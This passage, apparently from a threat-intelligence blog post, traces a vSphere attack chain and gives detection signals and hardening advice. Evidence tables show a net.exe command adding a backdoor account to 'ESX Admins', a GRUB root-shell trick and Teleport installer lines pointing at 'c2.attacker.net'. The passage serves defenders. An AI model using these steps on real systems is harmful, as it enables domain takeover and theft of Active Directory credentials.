find target names.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">explorer.EXE</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"C:...\\NOTEPAD.EXE\" \\prd-mgmt-srv02.acme-corp.local\\c$\\Users\\adm-svc-vcenter\\Desktop\\ESX HOST CLUSTER ISSUE.txt</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reconnaissance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Threat actor continues recon, opening files on a management server that likely contain names of systems, groups, or administrators.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">wsmprovhost.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"C:...\\net.exe\" group \"ESX Admins\"</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Enumeration</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Having found the group name, the threat actors use WinRM to remotely query the membership of the \"ESX Admins\" group to identify targets.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">wsmprovhost.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"C:...\\net.exe\" group \"ESX Admins\" ACME-CORP\\temp-adm-bkdr /add</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Manipulation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">This is the key attack. The threat actor adds their controlled account (temp-adm-bkdr) to the \"ESX Admins\" group, granting it full admin rights to vSphere.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">wsmprovhost.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">\"C:...\\net.exe\" group \"ESX Admins\"</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Verification</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor queries the group again immediately after the modification to confirm that their malicious user was successfully added.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 2: Active Directory user escalation</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Phase 2: The Pivot to vCenter — The Control Plane Compromise</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">With mapped Active Directory to vSphere credentials, the threat actors turn their sights on the heart of the virtual environment.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">The tactic:</strong><span style=\"vertical-align: baseline;\"> They use the compromised credentials to log into the vSphere vCenter Server GUI. From there, they leverage their vCenter Admin rights to gain what amounts to \"virtual physical access\" to the VCSA itself. They open a remote console, reboot the appliance, and edit the GRUB bootloader to start with a root shell (</span><code style=\"vertical-align: baseline;\">init=/bin/bash</code><span style=\"vertical-align: baseline;\">), giving them passwordless root access. They then change the root password to enable SSH access upon reboot. To maintain their foothold, they upload and execute </span><strong style=\"vertical-align: baseline;\">teleport</strong><span style=\"vertical-align: baseline;\">, a legitimate open source remote access tool, to create a persistent and encrypted reverse shell (C2 channel) that bypasses most firewall egress rules.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Why it's effective:</strong><span style=\"vertical-align: baseline;\"> vCenter’s delegation of trust in Active Directory often via LDAP(S) means the initial login isn't protected by MFA. The VCSA takeover abuses a fundamental privilege of a virtual environment administrator—the ability to interact with a VM's console pre-boot.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Key detection signals:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[LOGS]</strong><span style=\"vertical-align: baseline;\"> Monitor vCenter events for logins (</span><code style=\"vertical-align: baseline;\">com.vSphere.vc.UserLoginSessionLoginSuccessEvent</code><span style=\"vertical-align: baseline;\">) (</span><code style=\"vertical-align: baseline;\">com.vSphere.vc.UserLoginSessionLoginFailureEvent</code><span style=\"vertical-align: baseline;\">) and reboot (</span><code style=\"vertical-align: baseline;\">com.vSphere.vc.appliance.ApplianceRebootEvent</code><span style=\"vertical-align: baseline;\">).</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS]</strong><span style=\"vertical-align: baseline;\"> Monitor for log entries with prefixes like \"SSH\" in remote VCSA syslog to detect dropped SSH attempts or other blocked traffic via iptables.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS]</strong><span style=\"vertical-align: baseline;\"> On the VCSA, monitor </span><code style=\"vertical-align: baseline;\">journald</code><span style=\"vertical-align: baseline;\"> and implement VCSA remote forwarding of logs to a SIEM to detect unauthorized shell access and the enablement of the SSH and Shell service.</span></li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Remote syslog events for enablement of VCSA SSH service\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/vsphere-3944-fig7a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Remote syslog events for enablement of VCSA SSH service</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[NETWORK]</strong><span style=\"vertical-align: baseline;\"> Use Network Flow Logs to spot anomalous outbound connections from the VCSA's IP address.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[NETWORK] </strong><span style=\"vertical-align: baseline;\">Unusual DNS Requests from vCenter - This detection identifies when a vSphere vCenter server makes DNS requests for domains that are not on the explicit allow list of known, trusted sites (e.g., </span><code style=\"vertical-align: baseline;\">vSphere.com</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">ntp.org</code><span style=\"vertical-align: baseline;\">, or internal domains).</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS] Use of cURL or Wget to download tools: </strong><span style=\"vertical-align: baseline;\">This detection can identify the use of command-line utilities like cURL or Wget on a critical server (such as a vCenter, Domain Controller, or database server) to download a file from an external URL.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Critical hardening and mitigation:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Enable the VCSA remote logging: </strong><span style=\"vertical-align: baseline;\">Implement</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">remote syslog forwarding on the VCSA appliance. </span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Enforce phishing-resistant MFA on vCenter:</strong><span style=\"vertical-align: baseline;\"> Implement a phishing-resistant MFA solution, such as FIDO2/WebAuthn, for all vCenter logins by federating authentication with a supported identity provider. This is a critical control that directly neutralizes the threat of credential theft, rendering phishing attacks against vCenter users ineffective.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Enforce least privilege in vCenter</strong><span style=\"vertical-align: baseline;\">: Strictly limit the use of the Administrator role, reserving it for dedicated \"break glass\" accounts only such as </span><code style=\"vertical-align: baseline;\">administrator@vsphere.local</code><span style=\"vertical-align: baseline;\">. Instead, create granular, custom roles for specific job functions to ensure users and groups only have the minimum permissions necessary, breaking the link between a compromised AD account and a full vCenter takeover.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Use the VCSA firewall and block shell access:</strong><span style=\"vertical-align: baseline;\"> Block all unnecessary outbound internet traffic from the VCSA using egress filtering and its built-in firewall. Disable the SSH and BASH shells by default. This thwarts the </span><code style=\"vertical-align: baseline;\">teleport</code><span style=\"vertical-align: baseline;\"> backdoor and makes the VCSA takeover significantly more difficult.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL]</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">Configure the VCSA's underlying iptables firewall: </strong><span style=\"vertical-align: baseline;\">Enforce a Zero Trust allow-list for all management interfaces (443, 5480, 22) and enable logging for all denied connections. The default VCSA GUI firewall can be disabled by an attacker with a compromised web session and, crucially, it does not log blocked connection attempts. By configuring iptables at the OS level, the rules become immune to GUI tampering, and every denied connection is logged and forwarded to your SIEM.</span></li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Table 3 displays threat actor actions in support of Teleport Installation along with key evidence that an organization may use to detect this activity.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Tactic</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Key Evidence </strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Actor's Goal</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Execute Script &amp; Assert Privileges</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">sudo: root : ... COMMAND=/usr/bin/bash -c '#!/bin/bash...'</span></p>\n<p><span style=\"vertical-align: baseline;\">assert_running_as_root()</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor executes the installer via sudo. The script's first action is to confirm it has the root permissions required for system-wide installation.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Define Installation Parameters</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">SCRIPT_NAME=\"teleport-installer\"</code></p>\n<p><code style=\"vertical-align: baseline;\">TELEPORT_BINARY_DIR=\"/usr/local/bin\"</code></p>\n<p><code style=\"vertical-align: baseline;\">TELEPORT_CONFIG_PATH=\"/etc/teleport.yaml\"</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The script defines its core parameters, including where the backdoor's binaries and configuration files will be placed on the compromised VCSA's filesystem.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Hardcode C2 &amp; Authentication Details</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">TARGET_HOSTNAME='c2.attacker.net'</code></p>\n<p><code style=\"vertical-align: baseline;\">JOIN_TOKEN='[REDACTED_JOIN_TOKEN]'</code></p>\n<p><code style=\"vertical-align: baseline;\">CA_PIN_HASHES='sha256:[REDACTED_CA_PIN_HASH]</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor embeds the unique, pre-generated credentials required for the agent to connect and authenticate to their external command-and-control (C2) server</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Detect OS &amp; Select Package Type</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">if [[ ${f} != \"tarball\" <br />&amp;&amp; ${f} != \"deb\" ...</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The script contains logic to detect the underlying operating system (e.g., Debian, RHEL, or a generic Linux like the VCSA) to ensure it uses the correct installation package (.deb, .rpm, or .tar.gz).</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Download &amp; Install Binaries</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Script logic proceeds to download the 'tarball' package and unpacks binaries to </span><code style=\"vertical-align: baseline;\">/usr/local/bin</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Based on the OS detection, the script would then download the appropriate Teleport package from an threat actor-controlled source and install the binaries (</span><code style=\"vertical-align: baseline;\">teleport</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">tsh</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">tctl</code><span style=\"vertical-align: baseline;\">) into the predefined directory.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Establish Persistence</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">SYSTEMD_UNIT_PATH=\"/lib/systemd/<br />system/teleport.service\"</code></p>\n<p><span style=\"vertical-align: baseline;\">[Implied Action] Script creates and enables a systemd unit file</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">To ensure the backdoor survives reboots, the script creates a systemd service file using the defined path. It then enables and starts the teleport service, which initiates the final, persistent connection to the C2 server.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 3: VCSA Teleport installation</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Phase 3: The Hypervisor Heist — Offline Credential Theft and Exfiltration</span></h3>\n<p><span style=\"vertical-align: baseline;\">This is where the threat actor leverages their vSphere control to operate beneath the notice of in-guest security and EDR.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">The tactic:</strong><span style=\"vertical-align: baseline;\"> From vCenter, the threat actor enables SSH on the ESXi hosts and reset their root passwords. They then execute an offline attack by identifying a Domain Controller VM, powering it off, and detaching its virtual disk (</span><code style=\"vertical-align: baseline;\">.vmdk</code><span style=\"vertical-align: baseline;\">). This disk is then attached as a secondary drive to a forgotten or \"orphaned\" VM they control. From this unmonitored machine, they copy the </span><code style=\"vertical-align: baseline;\">NTDS.dit</code><span style=\"vertical-align: baseline;\"> Active Directory database. The process is then reversed, and the DC is powered back on as if nothing happened. The stolen data is then moved in a two-stage process: first, an internal transfer from the orphaned VM to the compromised VCSA using </span><code style=\"vertical-align: baseline;\">sftp</code><span style=\"vertical-align: baseline;\">, and second, an external exfiltration from the VCSA through the already-established </span><code style=\"vertical-align: baseline;\">teleport</code><span style=\"vertical-align: baseline;\"> C2 channel to a threat actor controlled cloud service.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Why it's effective:</strong><span style=\"vertical-align: baseline;\"> This entire operation occurs at the hypervisor layer, making it invisible to any EDR or security agent running inside the Domain Controller's operating system. The use of the VCSA as a data funnel bypasses any network segmentation rules.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Table 4 displays threat actor actions in support of VM data exfiltration along with key evidence that an organization may use to detect this activity.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Tactic</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Evidence Source</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Key Evidence</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Actor's Goal</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Identify Target VM</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Browser History</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">URL: </span><code style=\"vertical-align: baseline;\">https://vcsa-prod-01.acme.local/ui/...</code></p>\n<p><span style=\"vertical-align: baseline;\">Page Title: vSphere - ACME-DC01 - Datastores</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor, logged in as a compromised user , browses the vSphere UI to locate the virtual machine for the target Domain Controller (ACME-DC01).</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Identify Staging VM</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Browser History</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">URL: </span><code style=\"vertical-align: baseline;\">https://vcsa-prod-01.acme.local/ui/...</code></p>\n<p><span style=\"vertical-align: baseline;\">Page Title: vSphere - OLD-APPSRV-01 - Networks</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor identifies a seemingly abandoned server (OLD-APPSRV-01) to use as their staging VM, onto which they will mount the DC's disk.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Execute Disk Swap</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vCenter Event Log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Event: </span><code style=\"vertical-align: baseline;\">[vim.event.VmReconfiguredEvent]</code></p>\n<p><code style=\"vertical-align: baseline;\">User: ACME\\threat.actor</code></p>\n<p><code style=\"vertical-align: baseline;\">Action: Reconfigured OLD-APPSRV-01 on esxi-prod-02.acme.local</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The threat actor triggers a VM reconfiguration on the staging VM. This is the start of the disk attachment process.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Confirm Disk Attachment</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">vCenter Event Log</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Device Change: ...backing = (fileName = 'ds:///vmfs/volumes/.../ACME-DC01/ACME-DC01_4.vmdk' ...)</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The log shows a disk device being modified on the staging VM. The source file path clearly shows that the virtual disk (.vmdk) belonging to the Domain Controller (ACME-DC01) is being attached.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Confirm Host Execution</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ESXi Host Log (hostd.log)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Task: </span><code style=\"vertical-align: baseline;\">VpxaTask: VpxaReconfigVM /vmfs/volumes/.../OLD-APPSRV-01/OLD-APPSRV-01.vmx</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Simultaneously, the ESXi host logs the ReconfigVM_Task being executed against the staging VM, confirming the action was carried out at the hypervisor level.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 4: Virtual machine data exfiltration</span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><strong style=\"vertical-align: baseline;\">Key detection signals:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[BEHAVIOR] Monitor for reconnaissance in the vSphere UI:</strong><span style=\"vertical-align: baseline;\"> Before the attack, the threat actor browses the vSphere client to identify their target (e.g., a VM named </span><code style=\"vertical-align: baseline;\">ACME-DC01</code><span style=\"vertical-align: baseline;\">) and their staging VM (</span><code style=\"vertical-align: baseline;\">OLD-APPSRV-01</code><span style=\"vertical-align: baseline;\">). If UI access logs or browser histories from admin workstations are available, correlating suspicious browsing patterns with a subsequent reconfiguration event can provide very early warning.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS] Scrutinize: </strong><span style=\"vertical-align: baseline;\">As shown in this anonymised real-world example, a </span><code style=\"vertical-align: baseline;\">vim.event.VmReconfiguredEvent</code><span style=\"vertical-align: baseline;\"> for the staging VM (e.g., </span><code style=\"vertical-align: baseline;\">OLD-APPSRV-01</code><span style=\"vertical-align: baseline;\">) will contain the file path of the </span><span style=\"font-style: italic; vertical-align: baseline;\">target VM's</span><span style=\"vertical-align: baseline;\"> disk in its configuration details (e.g., </span><code style=\"vertical-align: baseline;\">backing = (fileName = '.../ACME-DC01/ACME-DC01_4.vmdk' ...)</code><span style=\"vertical-align: baseline;\">). Create high-priority alerts that parse this event data to detect when a disk from a critical asset is attached to any non-standard machine.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS] Correlate the full event sequence:</strong><span style=\"vertical-align: baseline;\"> A high-fidelity alert can be built by correlating the full sequence of vCenter events on a critical asset: </span><code style=\"vertical-align: baseline;\">VmPoweredOffEvent</code><span style=\"vertical-align: baseline;\">, followed by the </span><code style=\"vertical-align: baseline;\">VmReconfiguredEvent</code><span style=\"vertical-align: baseline;\"> previously detailed, and eventually a </span><code style=\"vertical-align: baseline;\">VmPoweredOnEvent</code><span style=\"vertical-align: baseline;\"> combined with a restart initiated by vmtoolsd.exe, along with supporting Windows guest events like 6006 (shutdown) and 6005 (startup).</span></li>\n<li><strong style=\"vertical-align: baseline;\">[BEHAVIOR] Create CRITICAL alerts</strong><span style=\"vertical-align: baseline;\"> for any power-on or reconfiguration event on VMs located in a \"Decommissioned\" or \"Orphaned\" folder as these are prime candidates for the threat actors staging VM.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[LOGS] Monitor ESXi host changes:</strong><span style=\"vertical-align: baseline;\"> Alert on SSH service start via vCenter events (</span><code style=\"vertical-align: baseline;\">vim.event.HostServiceStartedEvent</code><span style=\"vertical-align: baseline;\">), firewall configuration changes (</span><code style=\"vertical-align: baseline;\">vim.event.HostFirewallInfoChangedEvent</code><span style=\"vertical-align: baseline;\">), and direct root shell access logs on the ESXi hosts themselves.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Critical hardening and mitigation:</strong>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Use vSphere VM encryption:</strong><span style=\"vertical-align: baseline;\"> Encrypt all Tier 0 virtualized assets. This is the definitive technical block for the offline \"Disk Swap\" attack as the stolen </span><code style=\"vertical-align: baseline;\">.vmdk</code><span style=\"vertical-align: baseline;\"> file would be unreadable.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Implement a strict VM decommissioning process:</strong><span style=\"vertical-align: baseline;\"> Formally decommission old VMs by deleting their disks. Do not leave powered-off, \"orphaned\" VMs on your datastores as these are the ideal workbenches for threat actors.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Harden ESXi accounts:</strong><span style=\"vertical-align: baseline;\"> Disable the default ESXi </span><code style=\"vertical-align: baseline;\">root</code><span style=\"vertical-align: baseline;\"> account in favor of a named \"break glass\" account with a highly complex password. On ESXi 8.0+, run </span><code style=\"vertical-align: baseline;\">esxcli system account set -i vpxuser -s false</code><span style=\"vertical-align: baseline;\"> to prevent a compromised vCenter user from changing ESXi root passwords.</span></li>\n<li><strong style=\"vertical-align: baseline;\">[CRITICAL] Enable ESXi remote audit logging:</strong><span style=\"vertical-align: baseline;\"> Enable remote ESXi audit logging (</span><code style=\"vertical-align: baseline;\">vpxa.log</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">hostd.log</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">audit_records</code><span style=\"vertical-align: baseline;\">) to a SIEM to provide verbose, centralized details of security-focused events on the hosts themselves.</span></li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Remote syslog events for SSH access to ESXi\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/vsphere-3944-fig8.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: Remote syslog events for SSH access to ESXi</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  